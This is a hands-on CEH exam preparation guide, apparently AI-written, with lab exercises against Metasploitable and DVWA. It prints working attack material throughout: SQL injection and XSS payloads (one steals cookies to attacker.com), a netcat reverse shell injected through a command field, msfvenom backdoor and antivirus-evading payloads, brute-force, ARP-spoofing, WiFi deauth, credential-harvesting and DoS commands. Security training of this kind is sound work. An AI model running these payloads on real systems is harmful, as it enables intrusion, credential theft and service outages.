# CEH (Certified Ethical Hacker) Practical Training Guide

**Version:** 1.0 
**Created:** 2026-05-05 
**Objective:** Hands-on preparation for CEH v12/v13 certification exam 
**Platform:** Kali Linux 2024+

---

## ETHICAL USE - MANDATORY READING

**WARNING:** These tools and techniques are EXCLUSIVELY for:
- Your own systems and infrastructure
- Systems with explicit written authorization
- Official penetration testing lab environments (HackTheBox, TryHackMe, DVWA, Metasploitable)
- CEH official iLabs practice environment

**PROHIBITED:**
- Any unauthorized system testing or scanning
- Illegal activities (hacking without authorization)
- Malicious intent or damage to systems

**Legal Liability:** The user bears full responsibility for their actions.

---

## Prerequisites

### Lab Environment Setup

#### 1. Kali Linux Installation
```bash
# VM Recommendations
RAM: 4GB minimum (8GB recommended)
CPU: 2+ cores
Disk: 40GB+ free space
Network: NAT or Host-Only adapter
```

#### 2. Vulnerable Target Systems (Legal Lab Environments)

**Offline Lab VMs (Free):**
```bash
# Metasploitable 2 (Basic)
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# Metasploitable 3 (Windows + Linux)
git clone https://github.com/rapid7/metasploitable3.git

# DVWA (Damn Vulnerable Web Application)
docker run -d -p 80:80 vulnerables/web-dvwa

# WebGoat (OWASP)
docker run -p 8080:8080 -p 9090:9090 webgoat/webgoat
```

**Online Lab Platforms:**
- **HackTheBox** (https://www.hackthebox.com) - Free + Paid
- **TryHackMe** (https://tryhackme.com) - Beginner-friendly, structured
- **PentesterLab** (https://pentesterlab.com) - Web vulnerabilities
- **VulnHub** (https://www.vulnhub.com) - Free downloadable VMs

#### 3. Network Configuration
```bash
# Kali Linux on isolated network (Virtualbox Host-Only Network)
# Metasploitable on same network
# Verify IP configuration
ip addr show
ifconfig

# Test connectivity
ping <target_ip>
```

---

## Module 1: Footprinting and Reconnaissance

### 1.1 Passive Information Gathering (OSINT)

**Objective:** Gather information about target systems without direct interaction.

#### Exercise 1.1: WHOIS and DNS Queries
```bash
# WHOIS information (domain owner, nameservers)
whois example.com

# DNS record queries
dig example.com ANY
nslookup example.com

# Nameserver identification
host -t ns example.com

# MX (Mail Exchange) records
host -t mx example.com
```

**Task:**
1. Find a legal test domain (e.g., scanme.nmap.org)
2. Gather: NS records, MX records, A records
3. Document your findings

#### Exercise 1.2: Metadata Analysis
```bash
# Exiftool usage (extract metadata from images, PDFs)
exiftool document.pdf
exiftool image.jpg

# Remove metadata
exiftool -all= image.jpg

# theHarvester - Email addresses, subdomain enumeration
theHarvester -d example.com -l 500 -b google
theHarvester -d example.com -b linkedin
```

**Task:**
1. Download a public PDF or image
2. Examine metadata (author, software version, GPS coordinates)
3. Remove sensitive data

#### Exercise 1.3: Google Dorking
```bash
# Google Dork operators
site:example.com filetype:pdf
intitle:"index of" site:example.com
inurl:admin site:example.com
cache:example.com

# Search for exposed databases
inurl:php?id= site:example.com
filetype:sql "password" site:example.com
```

**Task:**
1. Search for public FTP servers: `intitle:"index of" inurl:ftp`
2. Find PDF files on a domain: `site:example.com filetype:pdf`
3. **ONLY SEARCH PUBLIC INFORMATION** (don't break into anything!)

---

## Module 2: Scanning and Enumeration

### 2.1 Network Scanning (Nmap)

**Objective:** Identify live hosts, open ports, services, and versions.

#### Exercise 2.1: Basic Nmap Scanning
```bash
# Host Discovery (Ping Sweep)
nmap -sn 192.168.1.0/24

# Quick port scan (top 1000 ports)
nmap <target_ip>

# Full port scan (1-65535)
nmap -p- <target_ip>

# Service version detection
nmap -sV <target_ip>

# Operating system detection
sudo nmap -O <target_ip>

# Aggressive scan (OS, version, scripts, traceroute)
sudo nmap -A <target_ip>
```

**Task (Metasploitable VM):**
```bash
# 1. Find Metasploitable VM IP address
# 2. Run full port scan
sudo nmap -p- -sV -O <metasploitable_ip> -oN metasploitable_scan.txt

# 3. Analyze results:
#  - Which ports are open?
#  - Which services are running? (SSH, FTP, HTTP, SMB, MySQL)
#  - What OS version?
```

#### Exercise 2.2: Nmap Scripting Engine (NSE)
```bash
# Run default NSE scripts
nmap -sC <target_ip>

# Specific script categories
nmap --script vuln <target_ip>    # Vulnerability scanning
nmap --script exploit <target_ip>  # Exploit scripts (CAREFUL!)
nmap --script discovery <target_ip> # Service discovery

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users <target_ip>

# HTTP enumeration
nmap --script http-enum,http-title <target_ip> -p 80,443
```

**Task (Metasploitable):**
```bash
# Search for SMB vulnerabilities
sudo nmap --script smb-vuln* -p 445 <metasploitable_ip>

# HTTP directory brute force
nmap --script http-enum -p 80 <metasploitable_ip>
```

### 2.2 Vulnerability Scanning

#### Exercise 2.3: OpenVAS / Nessus Usage
```bash
# OpenVAS installation on Kali
sudo apt update
sudo apt install openvas
sudo gvm-setup
sudo gvm-check-setup

# Access web interface
https://127.0.0.1:9392
# Default user: admin
# Password: shown in gvm-setup output
```

**Task:**
1. Start a Full and Fast scan on Metasploitable VM
2. Wait for results (15-30 minutes)
3. Analyze discovered vulnerabilities:
- Number of critical vulnerabilities
- CVE identifiers
- Remediation recommendations

---

## Module 3: System Hacking

### 3.1 Password Cracking

#### Exercise 3.1: John the Ripper
```bash
# Crack Linux /etc/shadow file
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
john --show hashes.txt

# Wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# List hash types
john --list=formats

# Crack MD5 hash
echo -n "password123" | md5sum
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
```

**Task (Metasploitable):**
1. Obtain `/etc/shadow` file from Metasploitable (you'll learn how later)
2. Use John the Ripper to crack passwords
3. Try both dictionary attack and brute force

#### Exercise 3.2: Hydra - Network Login Cracking
```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://<target_ip>

# HTTP POST form brute force
hydra -l admin -P passwords.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# SMB brute force
hydra -l administrator -P passwords.txt smb://<target_ip>
```

**Task (Metasploitable):**
```bash
# 1. Create users.txt with known usernames:
cat > users.txt <<EOF
root
admin
msfadmin
user
postgres
EOF

# 2. Create passwords.txt with common passwords:
cat > passwords.txt <<EOF
password
admin
msfadmin
root
123456
EOF

# 3. Try SSH login
hydra -L users.txt -P passwords.txt ssh://<metasploitable_ip> -t 4
```

### 3.2 Exploitation

#### Exercise 3.3: Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Basic commands:
search <keyword>     # Search modules
use <module_path>     # Select module
show options       # Show parameters
set <option> <value>   # Set parameter
exploit          # Run exploit
sessions -l        # List active sessions
sessions -i <id>     # Interact with session
```

**Task 3.3.1: Metasploitable vsftpd Backdoor**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd backdoor module
search vsftpd

# Use module
use exploit/unix/ftp/vsftpd_234_backdoor

# Configure
set RHOSTS <metasploitable_ip>
show options

# Run exploit
exploit

# Verify (shell obtained)
whoami
id
uname -a
```

**Task 3.3.2: UnrealIRCd Backdoor**
```bash
msfconsole
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <metasploitable_ip>
set RPORT 6667
exploit

# After getting shell
whoami
cat /etc/passwd
```

#### Exercise 3.4: Meterpreter Post-Exploitation
```bash
# After obtaining Meterpreter session

# Basic information
sysinfo
getuid
ps

# Privilege escalation
getsystem

# Hashdump (password hash extraction)
hashdump

# Search for files
search -f *.txt
search -f passwords.txt

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam usage
webcam_list
webcam_snap

# Port forwarding
portfwd add -l 3389 -p 3389 -r <target_ip>
```

---

## Module 4: Web Application Security Testing

### 4.1 DVWA (Damn Vulnerable Web Application) Exercises

#### Setup
```bash
# Start DVWA Docker
docker run -d -p 80:80 vulnerables/web-dvwa

# Open in browser
http://localhost

# Login
Username: admin
Password: password

# Set security level: Security Level = Low
```

#### Exercise 4.1: SQL Injection
```bash
# Start Burp Suite (proxy)
burpsuite

# Configure browser proxy: 127.0.0.1:8080

# SQL Injection tests in DVWA (SQL Injection module)

# Basic tests in input field:
1' OR '1'='1
1' OR 1=1--
1' UNION SELECT NULL, NULL--
1' UNION SELECT user, password FROM users--

# Extract database version
1' UNION SELECT NULL, @@version--

# List tables
1' UNION SELECT NULL, table_name FROM information_schema.tables--

# List columns
1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
```

**Automated SQL Injection with SQLMap:**
```bash
# GET parameter attack
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<session_id>" --dbs

# List databases
sqlmap -u <url> --cookie="..." --dbs

# List tables
sqlmap -u <url> --cookie="..." -D dvwa --tables

# Extract data
sqlmap -u <url> --cookie="..." -D dvwa -T users --dump
```

#### Exercise 4.2: XSS (Cross-Site Scripting)
```bash
# DVWA XSS (Reflected) module

# Reflected XSS test payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

# Cookie stealing (send to your server)
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

# Stored XSS test (Guestbook module)
<script>alert(document.cookie)</script>
```

#### Exercise 4.3: Command Injection
```bash
# DVWA Command Injection module

# Basic test payloads (in IP input field):
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; uname -a

# Reverse shell (Kali listener)
# On Kali:
nc -lvnp 4444

# In DVWA input field:
127.0.0.1; nc -e /bin/bash <kali_ip> 4444
```

### 4.2 Web Enumeration and Directory Brute Force

#### Exercise 4.4: Gobuster / Dirb
```bash
# Gobuster - Directory brute force
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Dirb
dirb http://<target_ip> /usr/share/wordlists/dirb/common.txt

# Nikto - Web server vulnerability scanner
nikto -h http://<target_ip>

# WPScan - WordPress security audit
wpscan --url http://<target_ip> --enumerate u,p,t
```

**Task (Metasploitable):**
```bash
# 1. Run Gobuster on Metasploitable HTTP server
gobuster dir -u http://<metasploitable_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt

# 2. Run Nikto
nikto -h http://<metasploitable_ip>

# 3. Document discovered directories and vulnerabilities
```

---

## Module 5: Network Attacks

### 5.1 Man-in-the-Middle (MITM)

#### Exercise 5.1: ARP Spoofing (Ettercap)
```bash
# Start Ettercap GUI
sudo ettercap -G

# Command line mode:
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ARP spoofing
sudo ettercap -T -M arp:remote /<gateway_ip>/ /<target_ip>/

# 3. Monitor traffic
sudo wireshark &
# Select interface, filter: ip.addr == <target_ip>
```

**WARNING:** ONLY on your own network, in isolated lab environment!

#### Exercise 5.2: Bettercap
```bash
# Bettercap modern MITM framework
sudo bettercap

# Select network interface
> set arp.spoof.targets <target_ip>
> arp.spoof on
> net.sniff on

# HTTPS downgrade attack
> set http.proxy.sslstrip true
> http.proxy on

# DNS spoofing
> set dns.spoof.domains <domain_to_spoof>
> dns.spoof on
```

### 5.2 WiFi Auditing

#### Exercise 5.3: Aircrack-ng - WPA/WPA2 Cracking
```bash
# 1. Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# 2. Scan available networks
sudo airodump-ng wlan0mon

# 3. Monitor specific target (capture handshake)
sudo airodump-ng -c <channel> --bssid <target_mac> -w capture wlan0mon

# 4. Deauthentication attack (force handshake)
sudo aireplay-ng --deauth 10 -a <router_mac> wlan0mon

# 5. Crack handshake (wordlist attack)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

**WARNING:** ONLY on your own WiFi network or with explicit authorization!

---

## Module 6: Social Engineering

### 6.1 Phishing Campaigns (Gophish)

#### Exercise 6.1: Setting up Gophish
```bash
# Install Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# Web interface
https://127.0.0.1:3333
# Default: admin / <generated password shown in console>
```

**Task:**
1. Create email template (e.g., "IT Security Notice")
2. Create landing page (e.g., fake login page)
3. Create campaign for testing (ONLY with your own email addresses!)
4. Analyze statistics (who clicked, who entered data)

**ETHICAL RULES:**
- ONLY within your own organization, with prior authorization
- NEVER use real phishing emails for malicious purposes

### 6.2 SET (Social Engineering Toolkit)

#### Exercise 6.2: SET Credential Harvester
```bash
# Start SET
sudo setoolkit

# Menu: 1) Social-Engineering Attacks
# Menu: 2) Website Attack Vectors
# Menu: 3) Credential Harvester Attack Method
# Menu: 2) Site Cloner

# Set IP address (Kali IP)
# Clone URL (e.g., http://gmail.com)

# Victim opens in browser: http://<kali_ip>
# Login credentials will be logged
```

**WARNING:** ONLY in lab environment, for educational purposes!

---

## Module 7: Malware and Trojans

### 7.1 Payload Generation (msfvenom)

#### Exercise 7.1: Reverse Shell Payloads
```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f elf -o shell.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -o backdoor.apk

# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f raw > shell.php
```

#### Exercise 7.2: Setting up Listener (Metasploit)
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <kali_ip>
set LPORT 4444
exploit -j

# Execute payload on target (lab VM)
# Obtain Meterpreter session
sessions -l
sessions -i 1
```

**WARNING:** NEVER use on real systems without authorization!

---

## Module 8: Post-Exploitation and Privilege Escalation

### 8.1 Linux Privilege Escalation

#### Exercise 8.1: LinPEAS
```bash
# Download LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Run (on Metasploitable or other lab VM)
./linpeas.sh

# Analyze results:
# - SUID binaries
# - Sudo privileges
# - Kernel exploits
# - Writable /etc/passwd
```

#### Exercise 8.2: SUID Binary Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Example: nmap SUID exploit (old nmap versions)
nmap --interactive
!sh

# Use GTFOBins
# https://gtfobins.github.io/
```

### 8.2 Windows Privilege Escalation

#### Exercise 8.3: WinPEAS
```powershell
# Download WinPEAS to target
certutil -urlcache -f http://<kali_ip>/winPEAS.exe winPEAS.exe

# Execute
.\winPEAS.exe

# Analyze results:
# - Unquoted service paths
# - AutoLogon credentials
# - AlwaysInstallElevated registry
```

---

## Module 9: Sniffing and Traffic Analysis

### 9.1 Wireshark

#### Exercise 9.1: HTTP Credentials Sniffing
```bash
# Start Wireshark
sudo wireshark

# Select interface (e.g., eth0)
# Generate traffic: HTTP login to Metasploitable

# Wireshark filter:
http.request.method == "POST"

# Follow HTTP Stream
# Right click → Follow → HTTP Stream
# Visible: username, password in plain text
```

#### Exercise 9.2: FTP Password Capture
```bash
# Wireshark filter:
ftp

# FTP login to Metasploitable:
ftp <metasploitable_ip>
# Username: msfadmin
# Password: msfadmin

# Plain text password visible in Wireshark
```

### 9.2 tcpdump

#### Exercise 9.3: Traffic Capture
```bash
# Capture all traffic
sudo tcpdump -i eth0 -w capture.pcap

# Filter HTTP traffic
sudo tcpdump -i eth0 port 80 -w http_capture.pcap

# SSH traffic
sudo tcpdump -i eth0 port 22 -w ssh_capture.pcap

# Analyze PCAP file with Wireshark
wireshark capture.pcap
```

---

## Module 10: Denial of Service (DoS)

** CRITICAL WARNING:**
- DoS attacks are ILLEGAL on real systems
- ONLY test in isolated lab environment
- NEVER target production systems

### 10.1 Hping3 - SYN Flood

#### Exercise 10.1: SYN Flood (LAB VM ONLY)
```bash
# SYN flood attack (Metasploitable VM)
sudo hping3 -S --flood -V -p 80 <metasploitable_ip>

# TCP reset flood
sudo hping3 -R --flood -V -p 80 <metasploitable_ip>

# ICMP flood
sudo hping3 --icmp --flood <metasploitable_ip>
```

**TASK:** Monitor target system's CPU/memory usage during DoS.

### 10.2 Slowloris - HTTP DoS

#### Exercise 10.2: Slowloris Attack
```bash
# Install Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Attack (Metasploitable HTTP server)
python3 slowloris.py <metasploitable_ip> -p 80 -s 500

# Monitor Apache server response time
while true; do curl -w "%{time_total}\n" -o /dev/null -s http://<metasploitable_ip>; sleep 1; done
```

---

## Module 11: Evading IDS/Firewall

### 11.1 Nmap Evasion Techniques

#### Exercise 11.1: Fragmented Packets
```bash
# Fragment packets (IDS evasion)
sudo nmap -f <target_ip>

# Decoy scan (fake source IPs)
sudo nmap -D RND:10 <target_ip>

# Timing templates (slow scan)
nmap -T0 <target_ip> # Paranoid
nmap -T1 <target_ip> # Sneaky
nmap -T2 <target_ip> # Polite

# Randomize scan order
nmap --randomize-hosts <target_subnet>
```

### 11.2 Payload Encoding (Metasploit)

#### Exercise 11.2: Encoded Payload
```bash
# Encode payload (antivirus evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe

# List encoder types
msfvenom --list encoders

# Multiple encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -e x86/shikata_ga_nai -i 5 | msfvenom -e x86/alpha_mixed -i 3 -f exe -o multi_encoded.exe
```

---

## Module 12: Incident Response and Forensics

### 12.1 Log Analysis

#### Exercise 12.1: Linux Log Files
```bash
# SSH login attempts
cat /var/log/auth.log | grep "Failed password"

# Successful logins
last

# Sudo commands
cat /var/log/auth.log | grep sudo

# Apache access log
cat /var/log/apache2/access.log | grep "404"
cat /var/log/apache2/access.log | grep "union" -i # SQL injection attempts
```

### 12.2 Memory Forensics (Volatility)

#### Exercise 12.2: Volatility Basics
```bash
# Install Volatility
pip3 install volatility3

# Profile memory dump
vol3 -f memory.dmp windows.info

# List processes
vol3 -f memory.dmp windows.pslist

# Network connections
vol3 -f memory.dmp windows.netscan

# Extract password hashes
vol3 -f memory.dmp windows.hashdump
```

---

## CEH Exam Tips and Strategy

### Exam Structure
- **Number of questions:** 125
- **Duration:** 4 hours
- **Passing score:** 70-75% (variable)
- **Question types:** Multiple choice, drag-and-drop, simulation

### Exam Preparation Checklist

#### Weekly Practice Routine
```markdown
- [ ] **Monday:** Footprinting & Reconnaissance (3 hours practice)
- [ ] **Tuesday:** Scanning & Enumeration (Nmap, OpenVAS)
- [ ] **Wednesday:** System Hacking (Metasploit, password cracking)
- [ ] **Thursday:** Web Application Hacking (DVWA, SQLi, XSS)
- [ ] **Friday:** Network Attacks (MITM, WiFi, sniffing)
- [ ] **Saturday:** Practice Exam (120 questions, 4 hours)
- [ ] **Sunday:** Review incorrect answers, note-taking
```

#### Must-Know Commands (CEH Exam Essentials)
```bash
# Nmap
nmap -sS -sV -O -A <target>

# Metasploit
msfconsole → search vsftpd → use exploit/... → set RHOSTS → exploit

# Hydra
hydra -L users.txt -P pass.txt ssh://<target>

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Nikto
nikto -h http://<target>

# Wireshark filters
http.request.method == "POST"
ftp
tcp.flags.syn == 1

# tcpdump
tcpdump -i eth0 -w capture.pcap

# SQLMap
sqlmap -u <url> --dbs --dump

# Aircrack-ng
airmon-ng start wlan0
airodump-ng wlan0mon
```

### Online Practice Labs
1. **CEH Practical iLabs:** https://iclass.eccouncil.org/
2. **HackTheBox:** https://www.hackthebox.com (Academy + Retired Machines)
3. **TryHackMe:** https://tryhackme.com (Jr Penetration Tester Path)
4. **PentesterLab:** https://pentesterlab.com

### Recommended Study Materials
- **Book:** "CEH Certified Ethical Hacker All-in-One Exam Guide" (Matt Walker)
- **Video:** Udemy - "The Complete Ethical Hacking Course" (Heath Adams)
- **Practice Exams:** Boson CEH Practice Tests

---

## Legal and Ethical Guidelines

### EC-Council Code of Ethics

1. **Integrity:** Always act ethically
2. **Confidentiality:** Protect secrets
3. **Authorization:** Only test with permission
4. **Disclosure:** Responsible vulnerability disclosure
5. **No Harm:** Do not cause damage

### Legal Framework

**WARNING:** Unauthorized hacking can result in:
- Criminal prosecution
- Heavy fines
- Imprisonment (up to several years depending on jurisdiction)
- Civil liability

**Relevant Laws:**
- **USA:** Computer Fraud and Abuse Act (CFAA)
- **EU:** Computer Misuse Act, GDPR
- **International:** Budapest Convention on Cybercrime

**ATTENTION:** Hacking without authorization is a criminal offense punishable by imprisonment!

---

## Next Steps

1. **Set up lab environment** (Kali + Metasploitable + DVWA)
2. **Practice modules** (1-12, 10-15 hours weekly)
3. **CEH iLabs registration** (official practice environment)
4. **Practice exams** (at least 1 per week)
5. **Register for exam** (https://www.eccouncil.org/)

---

## Resources and Further Learning

### Free Resources
- **Kali Linux Documentation:** https://www.kali.org/docs/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **GTFOBins:** https://gtfobins.github.io/
- **HackTricks:** https://book.hacktricks.xyz/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings

### Communities
- **Reddit:** r/CEH, r/ethicalhacking, r/netsec
- **Discord:** HackTheBox, TryHackMe
- **Twitter:** InfoSec community (#infosec, #CEH)

---

**Created:** 2026-05-05 
**Author:** AI Assistant for portfolio demonstration 
**Purpose:** CEH certification exam preparation 

**LEGAL DISCLAIMER:** This document is for educational purposes ONLY. The author accepts no responsibility for illegal or unethical use of the techniques described herein.

---

## License

This training guide is released under the **MIT License**.

```
MIT License

Copyright (c) 2026 Infrastructure Team

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## Contributing

Contributions are welcome! If you find errors or want to add exercises:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/new-exercise`)
3. Commit your changes (`git commit -m 'Add new SQLi exercise'`)
4. Push to the branch (`git push origin feature/new-exercise`)
5. Open a Pull Request

---

## Contact

**Author:** Infrastructure Team 
**GitHub:** [Your GitHub Profile] 
**Email:** [Your Email] 
**LinkedIn:** [Your LinkedIn]

---

⭐ If this guide helped you, please give it a star on GitHub!
